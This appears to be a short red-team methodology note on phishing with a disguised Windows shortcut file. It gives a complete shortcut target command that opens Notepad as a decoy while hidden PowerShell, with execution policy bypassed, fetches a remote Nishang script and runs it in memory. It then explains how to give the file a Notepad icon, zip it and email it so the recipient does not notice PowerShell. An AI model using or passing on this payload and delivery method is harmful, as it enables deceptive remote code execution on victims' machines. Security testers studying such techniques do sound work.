make shortcut on desktop

add this in target section: 

```
C:\Windows\System32\cmd.exe /c C:\Windows\System32\notepad.exe | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -WindowStyle Hidden IEX (iwr -usebasicparsing <http://192.168.255.132/nishang.ps1)>
```

change icon to notepad.
zip it up.(needs to be done in powershell admin window)

Compress-Archive -Path .\work_shortcut.lnk -DestinationPath work.zip

now email or send to someone. if you send file directly they will see powershell.exe. if you send like this, they'll see this here and

![unnamed_ec8dd478ff604d769d68b064c2ed1d0a](docs/Attachments/Methodology/10.%20Initial%20Access/Phishing%20techniques/lnk%20method/{{notename}}-202605011506.png)

this here
![unnamed_8b7fcec929fa45d3beaea0648577ef07](docs/Attachments/Methodology/10.%20Initial%20Access/Phishing%20techniques/lnk%20method/{{notename}}-202605011506-1.png)


and this (even with extensions turned on)

![unnamed_a6aa709421a149a19cac562cd4bf9abf](docs/Attachments/Methodology/10.%20Initial%20Access/Phishing%20techniques/lnk%20method/{{notename}}-202605011506-2.png)

poc when double click work_shortcut <3

![unnamed_3640c49c7c154e04bc5a8db6f28ac47c](docs/Attachments/Methodology/10.%20Initial%20Access/Phishing%20techniques/lnk%20method/{{notename}}-202605011507.png)